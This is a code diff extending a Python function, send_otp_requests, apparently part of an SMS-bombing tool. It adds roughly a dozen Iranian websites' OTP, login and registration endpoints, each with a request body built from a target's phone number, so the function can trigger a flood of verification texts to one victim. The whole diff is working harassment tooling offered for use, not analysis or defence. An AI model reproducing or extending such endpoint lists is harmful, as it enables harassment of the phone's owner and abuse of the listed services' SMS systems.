@@ -3,10 +3,16 @@ def send_otp_requests(number):
         'snapp': ('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', {'cellphone': '0' + number}),
         'paaakar': ('https://api.paaakar.com/v1/customer/register-login?version=new1', {'mobile': '0' + number}),
         'ketabweb': ('https://ketabweb.com/login/?usernameCheck=1', {'username': '0' + number}),
+        'dastaneman': ('https://dastaneman.com/User/SendCode', {'mobile': '0098' + number}),
+        'noavarpub': ('https://noavarpub.com/logins/login.php?ref=https%3A%2F%2Fnoavarpub.com%2F', {'phone': '0' + number,'submit':'123'}),
+        'hovalvakil': ('https://api.hovalvakil.com/api/User/SendConfirmCode?userName='+number+'', None),
         'azarbadbook': ('https://azarbadbook.ir/ajax/login_j_ajax_ver/', {'phone': number}),
+        'kanoonbook': ('https://www.kanoonbook.ir/store/customer_otp', {'customer_username': number,'task':'customer_phone'}),
         'cheshmandazketab': ('https://www.cheshmandazketab.ir/Register', {'phone': '0' + number,'login':'1'}),
         'ketabir': ('https://sso-service.ketab.ir/api/v2/signup/otp?Mobile=0'+number+'&OtpSmsType=1', None),
         'snappshop': ('https://apix.snappshop.co/auth/v1/pre-login?lat=35.77331&lng=51.418591', {'mobile': '0' + number}),
+        'ketabium': ('https://www.ketabium.com/login-register', {'username': '0' + number}),
+        'rirabook': ('https://rirabook.com/loginAth', {'mobile1': '0' + number,'loginbt1':''}),
         'pashikshoes': ('https://api.pashikshoes.com/v1/customer/register-login', {'mobile': '0' + number}),
         'shimashoes': ('https://shimashoes.com/api/customer/member/register/', { 'email': '0' + number}),
         'lendo': ('https://api.lendo.ir/api/customer/auth/send-otp', {'mobile': '0' + number}),
@@ -123,6 +129,11 @@ def send_otp_requests(number):
             'password': '123456',
             'mobile': number,
         }),
+        'mahouney': (' https://mahouney.com/fa/Account/RegisterOrLoginByMobileNumber', {
+            'ReturnUrl': 'https://mahouney.com/',
+            'MobaileNumber': '0' + number,
+        }),
+       
         
     }
 
